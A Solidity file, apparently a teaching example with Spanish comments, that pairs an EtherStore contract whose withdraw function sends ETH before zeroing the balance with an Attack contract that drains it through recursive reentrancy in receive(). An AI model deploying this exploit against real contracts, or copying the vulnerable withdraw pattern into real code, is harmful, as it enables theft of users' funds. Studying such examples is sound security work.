// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract EtherStore {
    mapping(address => uint) public balances;

    // Deposito de ETH
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Retiro de ETH
    function withdraw() public {
        uint monto = balances[msg.sender];
        require(monto > 0);

        (bool sent, ) = msg.sender.call{value: monto}("");
        require(sent, "El envio de ETH ha fallado.");  
        balances[msg.sender] = 0;
    }

    // Funciona auxiliar para visualizar el balance total del contrato
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        // Creamos la instancia de EtherStore.
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Función receive() es llamada cuando EtherStore envia ETH a este contrato.
    receive() external payable {
        // Al retirar el primer ETH, EtherStore lo enviará a este hook que vuelve a llamar a withdraw de forma recursiva
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    // El ataque consiste en depositar 1 ETH e inmediatamente retirarlo
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Funciona auxiliar para visualizar el balance total del contrato.
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
